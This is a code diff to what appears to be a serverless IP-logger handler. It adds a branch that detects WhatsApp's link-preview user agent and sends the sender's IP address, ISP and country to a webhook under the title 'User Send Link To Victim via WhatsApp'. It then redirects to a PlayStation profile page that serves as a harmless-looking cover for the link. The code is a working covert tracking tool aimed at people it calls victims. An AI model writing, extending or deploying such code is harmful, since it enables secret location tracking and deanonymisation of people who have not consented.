@@ -165,6 +165,28 @@ export default async function handler(req, res) {
         }
 
 
+        // Check 5: WhatsApp External Hit
+        if (userAgent === "WhatsApp/2.23.20.0") {
+            const message = {
+                embeds: [
+                    {
+                        title: "User Send Link To Victim via WhatsApp",
+                        color: 0xFF0000,
+                        description: "Device info collected from sender.",
+                        fields: [
+                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                        ]
+                    }
+                ]
+            };
+            await sendToWebhook(message);
+            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            return res.end();
+        }
+        
+
         // Default: Full Info for Other Requests
         if (!ipDetails.hosting) {
             const message = {
